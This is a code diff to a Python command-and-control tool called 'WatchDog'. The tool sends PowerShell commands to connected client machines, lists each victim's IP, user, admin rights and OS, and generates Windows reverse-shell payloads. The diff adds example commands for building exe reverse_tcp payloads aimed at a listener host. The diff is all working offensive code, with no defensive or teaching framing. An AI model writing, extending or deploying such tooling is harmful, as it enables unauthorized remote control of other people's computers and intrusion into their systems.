@@ -6,6 +6,7 @@ import threading
 
 colorama.init()
 
+
 class WatchDog:
     def __init__(self):
         self.running = True
@@ -52,8 +53,8 @@ class WatchDog:
     def cmd_test_connection(self, conn):
         try:
             conn.send(bytes("Write-Output '   '", "utf-8"))
-            rm = conn.recv(64).decode("utf-8")
-            return rm[0:-2]
+            conn.recv(64).decode("utf-8")
+            return 1
         except:
             return 0
 
@@ -114,7 +115,7 @@ class WatchDog:
         client_number = 0
         print("")
         for pp in self.data_clients:
-            print(f"{colorama.Fore.LIGHTMAGENTA_EX}Client {client_number} connected IP: {pp[1]}, User: {pp[2]}, Admin: {pp[3]}, OS: {pp[4]}")
+            print(f"{colorama.Fore.LIGHTMAGENTA_EX}Client {client_number} IP: {pp[1]}, User: {pp[2]}, Admin: {pp[3]}, OS: {pp[4]}")
             client_number += 1
         print("")
 
@@ -207,6 +208,8 @@ class WatchDog:
                 print("<Example> generate payload=windows/powershell/reverse_tcp lport=5050")
                 print("<Example> generate payload=windows/batch/reverse_tcp lhost=192.168.10.1 lport=5050")
                 print("<Example> generate payload=windows/batch/reverse_tcp lport=5050")
+                print("<Example> generate payload=windows/exe/reverse_tcp lhost=192.168.10.1 lport=5050")
+                print("<Example> generate payload=windows/exe/reverse_tcp lport=5050")
                 print("")
                 print("")
                 print("")
@@ -272,8 +275,7 @@ class WatchDog:
 
             except:
                 pass
-
-        # print(f"python {self.generate["payload"]}.py {self.generate["lhost"]} {self.generate["lport"]}")
+                
         print("")
         os.system(f"python {self.generate['payload']}.py {self.generate['lhost']} {self.generate['lport']}")
         print("")
